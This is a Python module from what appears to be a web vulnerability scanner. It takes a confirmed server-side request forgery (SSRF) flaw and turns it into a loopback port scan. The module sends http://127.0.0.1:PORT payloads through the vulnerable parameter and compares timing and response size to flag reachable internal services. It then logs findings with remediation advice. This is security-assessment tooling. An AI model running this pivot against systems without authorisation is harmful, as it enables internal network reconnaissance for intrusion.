"""VAJRA web.ssrf_pivot — drill a *confirmed* SSRF into an internal port scan.

After ssrf_scan confirms a server-side fetch primitive, we reuse the same
parameter to probe loopback/internal hosts read-only. Port-open detection is a
latency + response-differential heuristic against two closed-reference ports,
so a filtered-but-responds host does not false-positive. Findings are
confidence=possible signals for the operator to validate."""
import time

from core.database import Finding

PIVOT_PORTS = [22, 25, 80, 443, 3306, 5432, 6379, 8000, 8080, 8081, 8443,
               8888, 9000, 9200, 1433, 5901, 10000, 27017]
CLOSED_REFS = [1, 3]
MAX_PAYLOADS_PER_PARAM = 22


def _raw_status(engine, origin, method, param, value):
    try:
        from modules.web.vuln_scanner import send_point
        pt = type("P", (), {})()
        pt.origin, pt.method = origin, method
        pt.url, pt.fields, pt.kind = origin + "?x=y", [(param, value)], "query"
        r = send_point(engine, pt, param, value)
        if r.status == 0 and len(r.body) > 50 and not r.body.startswith("0"):
            return None
        return (r.status, len(r.body), r.elapsed if getattr(r, "elapsed",
                                                            None) else 0.0)
    except Exception:
        return None


def run(engine):
    t = engine.target
    confirmed = engine.state.get("ssrf_confirmed") or []
    if not confirmed:
        engine.db.add_event(t.display, "web.ssrf_pivot",
                            "no confirmed SSRF primitives to pivot with")
        return
    total_open = []
    for c in confirmed[:4]:
        origin = c["url"] or c["origin"]
        method = c.get("method", "GET")
        param = c.get("param")
        if not origin or not param:
            continue
        refs = {}
        for rp in CLOSED_REFS:
            st = _raw_status(engine, origin, method, param,
                             "http://127.0.0.1:%d/x" % rp)
            if st:
                refs[rp] = st
        if not refs:
            continue
        ref_status = max(r[0] for r in refs.values())
        ref_len = max(r[1] for r in refs.values())
        ref_time = min(r[2] for r in refs.values())
        hits = []
        for port in PIVOT_PORTS:
            st = _raw_status(engine, origin, method, param,
                             "http://127.0.0.1:%d/x" % port)
            if not st:
                continue
            rstatus, rlen, rtime = st
            time_fast = rtime < ref_time + 0.35
            len_diff = abs(rlen - ref_len) > 120
            body_flag = rlen > 60 and rstatus not in (0, 599) and \
                rtime > 0 and time_fast
            if time_fast and (len_diff or body_flag or
                              rstatus != ref_status):
                hits.append((port, rstatus, rlen, round(rtime, 2)))
            time.sleep(0.05)
        for port, rstatus, rlen, rtime in hits[:8]:
            total_open.append((origin, param, port, rstatus, rlen, rtime))
            engine.db.add_finding(Finding(
                t.display, "web.ssrf_pivot", "info-leak", "medium",
                "SSRF pivot: 127.0.0.1:%d reachable (param '%s')" %
                (port, param),
                detail="Confirmed SSRF primitive reaches the loopback port "
                       "with a distinct response (status %s, %d bytes, %.2f s "
                       "vs closed-ref %.2f s)." % (rstatus, rlen, rtime,
                                                   ref_time),
                evidence="method=%s origin=%s\npayload=http://127.0.0.1:%d/x"
                         "\nstatus=%d len=%d time=%.2fs" % (
                             method, origin, port, rstatus, rlen, rtime),
                remediation="Combine SSRF with internal firewall policy; "
                            "block egress to loopback/link-local from app "
                            "tiers.",
                confidence="possible"))
            engine.log.finding("[ssrf-pivot] %s:%d (%s) -> %s" %
                               ("127.0.0.1", port, param, origin[:60]))
        if hits:
            engine.state.setdefault("ssrf_pivot", []).append(
                {"origin": origin, "param": param, "open": hits})
    if not total_open:
        engine.db.add_finding(Finding(
            t.display, "web.ssrf_pivot", "coverage", "info",
            "SSRF pivot sweep (loopback, %d ports) found no reachable "
            "services" % len(PIVOT_PORTS),
            detail="Loopback is likely firewalled from the app tier; the "
                   "confirmed SSRF may still reach other internal hosts.",
            confidence="possible"))